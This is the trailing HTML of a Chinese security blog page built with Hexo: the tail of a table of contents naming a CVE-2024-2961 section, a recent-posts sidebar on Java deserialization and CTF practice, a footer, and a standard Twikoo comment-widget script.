href="#CVE-2024-2961%EF%BC%9A%E5%B0%86phpfilter%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%8F%90%E5%8D%87%E4%B8%BA%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">4.3.</span> <span class="toc-text">CVE-2024-2961：将phpfilter任意文件读取提升为远程代码执行</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java反序列化"><img src="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java反序列化"/></a><div class="content"><a class="title" href="/2024/09/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java反序列化">java反序列化</a><time datetime="2024-09-11T16:47:22.000Z" title="发表于 2024-09-12 00:47:22">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E7%8E%B0/" title="长城杯复现"><img src="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="长城杯复现"/></a><div class="content"><a class="title" href="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E7%8E%B0/" title="长城杯复现">长城杯复现</a><time datetime="2024-09-08T13:29:58.000Z" title="发表于 2024-09-08 21:29:58">2024-09-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/07/javasec-RMI/" title="javasec RMI"><img src="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover14.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="javasec RMI"/></a><div class="content"><a class="title" href="/2024/09/07/javasec-RMI/" title="javasec RMI">javasec RMI</a><time datetime="2024-09-07T09:08:24.000Z" title="发表于 2024-09-07 17:08:24">2024-09-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/" title="ctfshow 元旦杯刷题"><img src="https://img0.baidu.com/it/u=2470536821,3065430161&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=889" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow 元旦杯刷题"/></a><div class="content"><a class="title" href="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/" title="ctfshow 元旦杯刷题">ctfshow 元旦杯刷题</a><time datetime="2024-09-05T07:48:37.000Z" title="发表于 2024-09-05 15:48:37">2024-09-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/04/%E5%88%B7%E9%A2%98/" title="刷题"><img src="https://raw.githubusercontent.com/lisien11/tw/main/Cover/cover4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="刷题"/></a><div class="content"><a class="title" href="/2024/09/04/%E5%88%B7%E9%A2%98/" title="刷题">刷题</a><time datetime="2024-09-03T23:51:15.000Z" title="发表于 2024-09-04 07:51:15">2024-09-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By L</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'http://111.230.38.159:8008/',
+      region: 'ap-guangzhou',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(init,0)
+    else getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(init)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'http://111.230.38.159:8008/',
+      region: 'ap-guangzhou',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+      
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script async data-pjax src="/js/LSE.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
